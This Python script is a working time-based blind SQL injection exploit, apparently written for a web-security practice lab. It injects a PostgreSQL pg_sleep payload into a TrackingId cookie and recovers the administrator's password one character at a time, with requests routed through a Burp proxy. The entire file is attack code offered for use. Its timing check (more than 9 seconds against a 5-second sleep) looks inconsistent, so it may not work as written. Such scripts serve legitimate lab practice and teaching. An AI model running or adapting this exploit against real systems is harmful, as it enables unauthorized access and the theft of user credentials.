import sys
import requests
import urllib3
import urllib

# Ignore SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Burp Suite proxy (optional)
proxies = {
    'http': 'http://127.0.0.1:8081',
    'https': 'http://127.0.0.1:8081'
}

def sqli_password(url):
    password_extracted = ""

    # Password length (adjust as needed)
    for i in range(1, 21):  # Example: 20 chars
        found_char = False

        for j in range(32, 126):  # Printable ASCII
            sql_payload = "' || (SELECT CASE WHEN (username='administrator' AND ascii(substring(password,%d,1))=%d) THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users) --" % (i, j)

            sql_payload_encoded = urllib.parse.quote(sql_payload)

            cookies = {
                'TrackingId':'1d0nkGZ7PCZE7TDg' + sql_payload_encoded,
                'session': '6Fa0UG6VijJIPLhMCZIyomPFMij9yeaw'
            }

            # Send request through Burp proxy
            r = requests.get(
                url,
                cookies=cookies,
                verify=False,
                proxies=proxies
            )

            # Check if response time > 9 sec means condition TRUE
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r[+] Password: ' + password_extracted)
                sys.stdout.flush()
                found_char = True
                break

        if not found_char:
            sys.stdout.write('\n[-] Character not found for position %d\n' % i)
            break

    print("\n[+] Extracted Password: %s" % password_extracted)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://www.example.com/" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()

